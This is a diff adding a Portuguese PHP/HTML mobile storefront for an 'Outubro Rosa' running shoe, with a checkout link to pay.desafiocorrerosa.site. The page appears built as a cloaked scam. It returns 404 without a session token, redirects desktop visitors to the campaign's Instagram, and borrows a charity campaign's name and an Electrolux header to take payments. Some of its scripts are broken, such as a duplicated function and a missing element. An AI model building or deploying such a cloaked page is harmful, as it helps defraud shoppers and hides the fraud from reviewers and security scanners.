@@ -1,0 +1,842 @@
+﻿<?php
+require("config/sessionToken.php");
+session_start();
+
+// Verifica se o token da sessão é verdadeiro
+if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionToken) {
+    http_response_code(404);
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="css/swiper-bundle.min.css">
+	<title>Tênis Corre 4 Outubro Rosa</title>
+	<style type="text/css">
+		body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            padding-bottom: 60px; /* Espaço para o rodap fixo */
+     
+        }
+                .content-wrapper {
+            width: 100%;
+            overflow-x: hidden; /* Bloqueia o scroll horizontal */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .header {
+            width: 100%;
+            height: auto;
+        }
+        .slider {
+            position: relative;
+            width: 100%;
+            overflow: hidden;
+        }
+        .slides {
+            display: flex;
+            transition: transform 0.5s ease-in-out;
+            width: 100%;
+        }
+        .slides img {
+            width: 100%;
+            height: auto;
+        }
+        #image-counter {
+            position: absolute;
+    bottom: 2px;
+    left: 50%;
+    transform: translateX(-50%);
+    background-color: rgba(255, 255, 255, 0.7);
+    padding: 1px 10px;
+    border-radius: 10px;
+    font-size: 13px;
+    font-weight: bold;
+        }
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #fff;
+            color: #000;
+            text-align: center;
+            padding: 10px;
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
+            box-sizing: border-box;
+        }
+        .footer .voltage-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .footer .voltage-options {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin-top: 5px;
+        }
+        .footer .voltage-options label {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 16px;
+        }
+        .footer .voltage-options input {
+            margin-right: 5px;
+        }
+        .footer {
+    display: flex;
+    justify-content: center; /* Centraliza o botão horizontalmente */
+    align-items: center; /* Centraliza o botão verticalmente, se necessário */
+    height: 8vh; /* Define a altura do footer para ocupar toda a altura da página */
+}
+
+.footer .buy-button {
+    background-color: #000000;
+    color: white;
+    padding: 14px 130px;
+    text-decoration: none;
+    border-radius: 10px;
+    font-size: 11px;
+    font-weight: bold;
+    text-transform: uppercase;
+}
+        .additional-image {
+            width: 100%;
+            height: auto;
+            margin-top: 23px; /* Espao entre o slider e a imagem adicional */
+        }
+        .additional-image3 {
+            width: 100%;
+            height: auto;
+            margin-top: 23px; /* Espao entre o slider e a imagem adicional */
+            margin-left: 41px;
+        }
+        .additional-imagee {
+            width: 100%;
+            height: auto;
+            margin-top: -23px;
+            margin-bottom: -15px; /* Espaço entre o slider e a imagem adicional */
+        }
+
+
+.dropdown {
+            position: relative;
+            display: inline-block;
+        }
+        
+
+        .dropbtn {
+            background-color: #ffffff;
+            color: black;
+            margin: 10px 42px;
+            white-space: nowrap; 
+            padding: 8px 16px;
+            font-size: 14px;
+            border: 2px solid black;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+            display: inline-block;
+            margin-right: 20px;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .dropbtn::after {
+            content: '▼';
+            font-size: 10px;
+            margin-left: 10px;
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            background-color: white;
+            min-width: 200px;
+            box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+            border-radius: 8px;
+            z-index: 1;
+        }
+
+        .dropdown-content a {
+            color: black;
+            padding: 16px;
+            text-decoration: none;
+            display: block;
+            transition: background-color 0.3s;
+        }
+
+        .dropdown-content a:hover {
+            background-color: #f1f1f1;
+        }
+
+        .dropdown:hover .dropdown-content {
+            display: block;
+        }
+
+        .dropdown:hover .dropbtn {
+            background-color: #e0e0e0;
+        }
+                /* Estilos do Modal */
+                .modal {
+            display: none; /* Inicia oculto */
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.4); /* Fundo preto com transparência */
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+            border-radius: 8px;
+            text-align: center;
+            position: relative;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .container {
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 55px;
+        }
+
+        /* Fonte Cooper Hewitt */
+        @import url('https://cdn3.123tp.net/c1d8d0722dd44a0a9545c250464bf099/css2.html');
+
+        /* Estilos da div de preço */
+        .price-container {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .product-price {
+            font-family: 'Cooper Hewitt', sans-serif;
+            font-size: 28px;
+            font-weight: 300;
+            color: #0033C6;
+            display: block;
+            font-weight: bold;
+            margin-left: -50px;
+            margin-top: 1px;
+            
+        }
+
+        .pix-text {
+            font-family: 'Cooper Hewitt', sans-serif;
+            font-size: 16px;
+            color: #9b9b9b;
+    display: block;
+    margin-bottom: 10px;
+    font-weight: bold;
+            margin-left: -50px;
+        }
+        .riscado-text {
+    font-family: 'Cooper Hewitt', sans-serif;
+    font-size: 14px; /* Tamanho um pouco menor */
+    color: #9b9b9b;
+    font-weight: bold;
+    margin-bottom: 5px; /* Espaçamento entre o texto e o preço */
+    text-align: left;
+    line-height: 1.2; /* Ajuste de altura da linha para um melhor espaçamento */
+    margin-left: -50px;
+ 
+    
+
+}
+
+.riscado-text span {
+    text-decoration: line-through; /* Aplica o risco ao valor */
+}
+
+
+          /* Estilos do botão "Comprar Agora" */
+          #checkoutButton {
+            background-color: #000000;
+    color: white;
+    font-weight: bold;
+    font-size: 16px;
+    padding: 12px 65px;
+    border-radius: 10px;
+    text-transform: uppercase;
+    transition: background-color 0.3s ease, color 0.3s ease;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 83%;
+    border: none;
+    text-decoration: none;
+        margin-left: -50px;
+ 
+        }
+
+        #checkoutButton:hover {
+            background-color: #333;
+            color: white;
+        }
+
+        .buy-now-btn-icon {
+            margin-right: 10px;
+            display: flex;
+            align-items: center;
+        }
+
+        .buy-now-btn-text-add {
+            display: inline-block;
+        }
+
+        .buy-now-btn-spinner {
+            margin-left: 10px;
+        }
+        <!--NEW  STYLE-->
+
+                .swiper-container {
+            width: 80%;
+            max-width: 900px;
+            margin: auto;
+            overflow: hidden; /* Oculta conteúdo fora do contêiner */
+        }
+
+        .swiper-wrapper {
+            display: flex;
+            transition: transform 0.3s ease;
+        }
+
+        .swiper-slide {
+            flex-shrink: 0;
+            width: 100%; /* Ocupa 100% da largura do contêiner */
+        }
+
+        .main-slider .swiper-slide img {
+            width: 100%;
+            height: auto;
+            object-fit: cover;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .main-slider .swiper-slide img:hover {
+            transform: scale(1.05);
+        }
+
+        .thumb-slider {
+            margin-top: 20px;
+        }
+
+        .thumb-slider .swiper-slide {
+            width: 18%;
+            cursor: pointer;
+        }
+
+        .thumb-slider .swiper-slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 8px;
+            border: 2px solid transparent;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            transition: border-color 0.3s, transform 0.3s ease;
+        }
+
+        .thumb-slider .swiper-slide-thumb-active img {
+            border-color: #007bff;
+            transform: scale(1.05);
+        }
+
+        .swiper-button-next, .swiper-button-prev {
+            color: #007bff;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            transition: background 0.3s;
+        }
+
+        .swiper-button-next:hover, .swiper-button-prev:hover {
+            background: #007bff;
+            color: #fff;
+        }
+
+        .swiper-button-next:after, .swiper-button-prev:after {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        @media (max-width: 768px) {
+            .swiper-container {
+                width: 100%;
+            }
+
+            .thumb-slider .swiper-slide {
+                width: 25%;
+            }
+        }
+        .size-selector-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 50px;
+      position: relative;
+    }
+
+    .size-selector {
+      background-color: white;
+      color: black;
+      padding: 10px 20px;
+      font-size: 16px;
+      border: 2px solid black;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s, color 0.3s;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 200px;
+      margin-bottom: 10px;
+    }
+
+    .size-selector:hover {
+      background-color: black;
+      color: white;
+    }
+
+    .size-options {
+      display: none;
+      position: absolute;
+      top: 50px;
+      background-color: white;
+      border: 2px solid black;
+      width: 100%;
+      z-index: 100;
+    }
+
+    .size-options label {
+      display: block;
+      padding: 10px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      border-bottom: 1px solid black;
+    }
+
+    .size-options label:last-child {
+      border-bottom: none;
+    }
+
+    .size-options label:hover {
+      background-color: lightgray;
+    }
+
+    .size-selector.active + .size-options {
+      display: block;
+    }
+
+    .arrow {
+      margin-left: 10px;
+      transition: transform 0.3s;
+    }
+
+    .active .arrow {
+      transform: rotate(180deg);
+    }
+    </style>
+
+<script src="../../scripts/utms/latest.js" async="" defer=""></script>
+
+<script type="text/javascript">
+    if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+      window.location.href = 'https://www.instagram.com/outubrorosa/';
+    }
+</script>
+<script type="text/javascript">
+	window.hasMobileFirstExtension = true;
+</script>
+
+<!-- CODIGO PIXEL -->
+
+</head>
+
+<body>
+    <div class="content-wrapper">
+<header>
+<img alt="Cabeçalho Electrolux" class="header" src="images/HEADER1-2.png">
+</header>
+<!-- Slider principal -->
+
+<div class="swiper-container main-slider">
+    <div class="swiper-wrapper">
+        <div class="swiper-slide">
+            <img src="images/PERFIL1.webp" alt="Imagem 1">
+        </div>
+        <div class="swiper-slide">
+            <img src="images/PERFIL2.webp" alt="Imagem 2">
+        </div>
+        <div class="swiper-slide">
+            <img src="images/PERFIL3.webp" alt="Imagem 3">
+        </div>
+        <div class="swiper-slide">
+            <img src="images/PERFIL4.webp" alt="Imagem 4">
+        </div>
+		<div class="swiper-slide">
+            <img src="images/PERFIL5.webp" alt="Imagem 5">
+        </div>
+
+    </div>
+    <!-- Botões de navegação -->
+    <!--<div class="swiper-button-next"></div>
+    <div class="swiper-button-prev"></div> -->
+</div>
+
+<div class="swiper-container thumb-slider">
+    <div class="swiper-wrapper">
+        <div class="swiper-slide">
+            <img src="images/PERFIL1.webp" alt="Thumb 1">
+        </div>
+        <div class="swiper-slide">
+            <img src="images/PERFIL2.webp" alt="Thumb 2">
+        </div>
+        <div class="swiper-slide">
+            <img src="images/PERFIL3.webp" alt="Thumb 3">
+        </div>
+        <div class="swiper-slide">
+            <img src="images/PERFIL4.webp" alt="Thumb 4">
+        </div>
+		<div class="swiper-slide">
+            <img src="images/PERFIL5.webp" alt="Thumb 5">
+        </div>
+      
+    </div>
+</div>
+<!-- Imagem adicional abaixo do slider -->
+
+
+
+<!--BOTAO TAM E CHECKOUT-->
+<div id="box-botoes-comprar">
+
+    <div class="d-flex">
+
+        <!-- Quantity field -->
+
+        <input type="hidden" name="quantity" id="quantitySelected" value="1">
+
+
+        <script>
+            document.getElementById("quantitySelected").addEventListener("change", function () {
+                const quantidade = document.getElementById("quantitySelected").value
+                updateParcelamento(quantidade)
+                const valor_produto = quantidade * Number('0,00'.replace('.', '').replace(',', '.'));
+                updateElementsWithClassName('valorEm12xCartao', (valor_produto * (12 <= qtd_sem_juros_parcelamento ? 1 : Number(decima_segunda_parcela_taxa)) / 12).toFixed(2).replace('.', ','))
+            });
+        </script>
+           <!-- Preço do Produto -->
+           <div class="price-container">
+            <span id="precoRiscado" class="riscado-text"><span></span></span>
+            <span id="precoProduto" class="product-price"></span>
+            <span class="pix-text"></span>
+        </div>
+
+        <div class="size-selector-container">
+            <div class="size-selector" onclick="toggleOptions()">
+              <span id="selected-size">Selecione o Tamanho</span>
+              <span class="arrow">▼</span>
+            </div>
+            <div class="size-options">
+			  <label for="size34" onclick="selectSize(34)">34</label>
+			  <label for="size35" onclick="selectSize(35)">35</label>
+              <label for="size36" onclick="selectSize(36)">36</label>
+              <label for="size37" onclick="selectSize(37)">37</label>
+              <label for="size38" onclick="selectSize(38)">38</label>
+              <label for="size39" onclick="selectSize(39)">39</label>
+              <label for="size40" onclick="selectSize(40)">40</label>
+              <label for="size41" onclick="selectSize(41)">41</label>
+              <label for="size42" onclick="selectSize(42)">42</label>
+              <label for="size43" onclick="selectSize(43)">43</label>
+              <label for="size44" onclick="selectSize(44)">44</label>
+			  <label for="size45" onclick="selectSize(45)">45</label>
+			  <label for="size46" onclick="selectSize(46)">46</label>
+            </div>
+          </div>
+     
+
+              <!-- Comprar agora -->
+				<a id="checkoutButton" href="https://pay.desafiocorrerosa.site/YEwR3AD0MRBgdKy" onclick="redirectToCheckout()" class="buttonPressed add-to-cart-btn btn button-buy btn-block d-flex align-items-center justify-content-center animate__animated">
+                    <span class="buy-now-btn-icon"></span>
+
+                    <span class="buy-now-btn-text-add add-to-cart-btn-text"><center>COMPRAR (R$149,99)</center></span>
+    
+                    <span class="buy-now-btn-spinner spinner-border spinner-border-sm ml-2" role="status" aria-hidden="true" style="display: none;"></span>
+                    <span class="buy-now-btn-text-loading add-to-cart-btn-text" style="display: none;">Carregando...</span>
+                </a>
+            </div>
+        </div>
+
+<span id="colorWarning2" class="warning-modal"></span>
+<p><img alt="Imagem adicional" class="additional-image" src="images/HEADER2.png"></p>
+<p><img alt="Imagem adicional" class="additional-image" src="images/HEADER3.png"></p>
+<p><img alt="Imagem adicional" class="additional-imagee" src="images/HEADER4.png"></p>
+<p><img alt="Imagem adicional" class="additional-imagee" src="images/HEADER5.png"></p>
+<p><img alt="Imagem adicional" class="additional-imagee" src="images/HEADER6.png"></p>
+
+
+<!-- Modal -->
+<div id="myModal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal()">×</span>
+        <p id="modalMessage"></p>
+    </div>
+</div>
+
+<div class="footer" id="footerDiv">
+    <a class="buy-button" id="buyButton1" href="https://pay.desafiocorrerosa.site/YEwR3AD0MRBgdKy" onclick="checkColor(event)">COMPRAR (R$149,99)</a>
+    <span id="colorWarning" class="warning-modal"></span>
+</div>
+</div>
+
+
+<script src="js/swiper-bundle.min.js"></script>
+<script>
+        const slides = document.querySelector('.slides');
+        const images = document.querySelectorAll('.slides img');
+        const imageCounter = document.getElementById('image-counter');
+        let currentIndex = 0;
+        const totalImages = images.length;
+        let startX;
+        let startY;
+        let isDragging = false;
+
+        function updateSlider() {
+            slides.style.transform = `translateX(${-currentIndex * 100}%)`;
+            imageCounter.textContent = `${currentIndex + 1} / ${totalImages}`;
+        }
+
+        function nextSlide() {
+            currentIndex = (currentIndex + 1) % totalImages;
+            updateSlider();
+        }
+
+        function prevSlide() {
+            currentIndex = (currentIndex - 1 + totalImages) % totalImages;
+            updateSlider();
+        }
+
+        slides.addEventListener('touchstart', (e) => {
+            startX = e.touches[0].clientX;
+            startY = e.touches[0].clientY;
+            isDragging = true;
+        });
+
+        slides.addEventListener('touchmove', (e) => {
+            if (!isDragging) return;
+            const currentX = e.touches[0].clientX;
+            const currentY = e.touches[0].clientY;
+            const diffX = startX - currentX;
+            const diffY = startY - currentY;
+
+            // Only perform horizontal swipe if horizontal movement is greater than vertical movement
+            if (Math.abs(diffX) > Math.abs(diffY)) {
+                e.preventDefault();
+                if (diffX > 50) {
+                    nextSlide();
+                    isDragging = false;
+                } else if (diffX < -50) {
+                    prevSlide();
+                    isDragging = false;
+                }
+            }
+        });
+
+        slides.addEventListener('touchend', () => {
+            isDragging = false;
+        });
+
+        // Auto-slide every 5 seconds
+        setInterval(nextSlide, 5000);
+
+        updateSlider();
+    </script>
+<script>
+    function selectSize(event, size) {
+        event.preventDefault();
+        var button = document.getElementById("dropdownButtonSize");
+        var dropdownContent = document.getElementById("dropdownContentSize");
+        button.textContent = "Tamanho: " + size;
+        dropdownContent.style.display = "none";
+    }
+
+    function selectColor(event, color) {
+        event.preventDefault();
+        var button = document.getElementById("dropdownButtonColor");
+        var dropdownContent = document.getElementById("dropdownContentColor");
+        button.textContent = "Cor: " + color;
+        dropdownContent.style.display = "none";
+
+        // Atualiza o link de compra conforme a cor selecionada
+        var buyButton1 = document.getElementById("buyButton1");
+        var buyButton2 = document.getElementById("buyButton2");
+
+        if (color === 'Preta') {
+            buyButton1.href = "https://pay.desafiocorrerosa.site/YEwR3AD0MRBgdKy";
+            buyButton2.href = "https://pay.desafiocorrerosa.site/YEwR3AD0MRBgdKy";
+        } else if (color === 'Branca') {
+            buyButton1.href = "https://pay.desafiocorrerosa.site/YEwR3AD0MRBgdKy";
+            buyButton2.href = "https://pay.desafiocorrerosa.site/YEwR3AD0MRBgdKy";
+        }
+    }
+
+    function checkColor(event) {
+        var selectedColor = document.getElementById("dropdownButtonColor").textContent;
+        if (selectedColor === "Cor") {
+            event.preventDefault();
+            showModal("Por favor, selecione uma cor antes de comprar.");
+            return false;
+        } else {
+            closeModal();
+            return true;
+        }
+    }
+
+    function showModal(message) {
+        var modal = document.getElementById("myModal");
+        var modalMessage = document.getElementById("modalMessage");
+        modalMessage.textContent = message;
+        modal.style.display = "block";
+    }
+
+    function closeModal() {
+        var modal = document.getElementById("myModal");
+        modal.style.display = "none";
+    }
+
+    document.addEventListener('click', function(event) {
+        var dropdowns = document.querySelectorAll('.dropdown');
+        dropdowns.forEach(function(dropdown) {
+            var dropdownContent = dropdown.querySelector('.dropdown-content');
+            if (!dropdown.contains(event.target)) {
+                dropdownContent.style.display = 'none';
+            }
+        });
+    });
+
+    document.querySelectorAll('.dropbtn').forEach(function(button) {
+        button.addEventListener('click', function(event) {
+            var dropdownContent = this.nextElementSibling;
+            dropdownContent.style.display = dropdownContent.style.display === 'block' ? 'none' : 'block';
+            event.stopPropagation();
+        });
+    });
+</script>
+<script>
+    function redirectToLink(url) {
+        window.location.href = url;
+    }
+</script>
+
+<script>
+  var thumbSlider = new Swiper('.thumb-slider', {
+        spaceBetween: 10,
+        slidesPerView: 4,
+        freeMode: true,
+        watchSlidesProgress: true,
+    });
+
+    var mainSlider = new Swiper('.main-slider', {
+        spaceBetween: 10,
+        slidesPerView: 1,
+        centeredSlides: true,
+        navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+        },
+        thumbs: {
+            swiper: thumbSlider
+        },
+        simulateTouch: true,
+        touchRatio: 1,
+        touchAngle: 45,
+        loop: true,
+    });
+
+
+</script>
+<script>
+    function toggleOptions() {
+      const selector = document.querySelector('.size-selector');
+      const options = document.querySelector('.size-options');
+      
+      // Alterna entre abrir e fechar as opções
+      options.style.display = options.style.display === 'block' ? 'none' : 'block';
+      
+      // Alterna a classe "active" para a seta
+      selector.classList.toggle('active');
+    }
+  
+    function selectSize(size) {
+      const selectedSize = document.getElementById('selected-size');
+      const options = document.querySelector('.size-options');
+      
+      // Atualiza o texto do seletor com o tamanho escolhido
+      selectedSize.textContent = 'Tamanho: ' + size;
+      
+      // Fecha o dropdown
+      options.style.display = 'none';
+      
+      // Remove a classe 'active' para que a seta volte ao normal
+      document.querySelector('.size-selector').classList.remove('active');
+    }
+  
+    // Fecha as opções se o usuário clicar fora do seletor
+    window.addEventListener('click', function(event) {
+      const selector = document.querySelector('.size-selector');
+      const options = document.querySelector('.size-options');
+      
+      if (!selector.contains(event.target)) {
+        options.style.display = 'none';
+        selector.classList.remove('active');
+      }
+    });
+  </script>
+
+
+    <script src="js/latest.js" async="" defer=""></script>
+  
+
+
+
+                    <script async="true" src="js/googletagmanager.js"></script>
+                </body></html>
